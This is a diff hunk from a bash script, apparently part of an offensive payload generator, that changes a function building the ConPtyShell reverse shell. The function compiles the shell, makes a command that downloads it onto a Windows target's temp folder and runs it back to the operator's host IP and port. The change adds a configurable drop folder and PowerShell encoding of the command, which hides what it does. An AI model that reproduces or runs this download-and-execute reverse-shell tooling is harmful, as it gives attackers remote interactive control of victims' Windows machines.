@@ -329,11 +329,17 @@ get_powershell_interactive_shell_compiled() {
         dotnet_command="csc"
     fi
     build_dotnet "ConPtyShell"
-    unzip -qq -o build.zip 
-    cp build/$output_file .
-    cmd=$(generate_windows_download "$output_file" "C:\\windows\\temp\\$output_file")
+    if [[ ! -f ConPtyShell.done ]]; then
+        unzip -qq -o build.zip 
+        cp build/$output_file .
+    fi
+    if [[ -z $target_folder ]]; then
+        target_folder="c:\\windows\\temp\\"
+    fi
+    cmd=$(generate_windows_download "$output_file" "$target_folder$output_file")
     stty_size=$(stty size)
-    cmd+="C:\\windows\\temp\\$output_file $host_ip $host_port $stty_rows $stty_cols"
+    cmd+="$target_folder$output_file $host_ip $host_port $stty_rows $stty_cols;"
+    cmd=$(encode_powershell "$cmd")
 }
 
 get_powershell_interactive_shell_reflected() {
